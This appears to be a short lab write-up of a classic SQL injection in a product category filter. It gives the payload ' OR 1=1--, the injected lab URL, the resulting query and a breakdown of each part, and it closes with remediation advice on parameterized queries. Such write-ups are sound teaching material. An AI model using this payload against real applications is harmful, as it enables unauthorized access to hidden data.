The application passes user-supplied input directly into a SQL query without sanitization. When filtering products by category, the backend runs:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
The released = 1 condition hides unreleased products from users. Since the category parameter is injectable, this filter can be completely bypassed.
  Payload
'+OR+1=1--
Injected URL
https://<LAB-ID>.web-security-academy.net/filter?category=Gifts'+OR+1=1--
Resulting Query
sqlSELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
Part                  Effect
'                     Closes the category string
OR 1=1                Makes the condition always true
  --                  Comments out the rest of the query
All products from all categories are returned
Both released and unreleased products are exposed
Bypasses business logic meant to hide sensitive inventory


Use parameterized queries / prepared statements
Never concatenate user input directly into SQL
Apply input validation on all query parameters
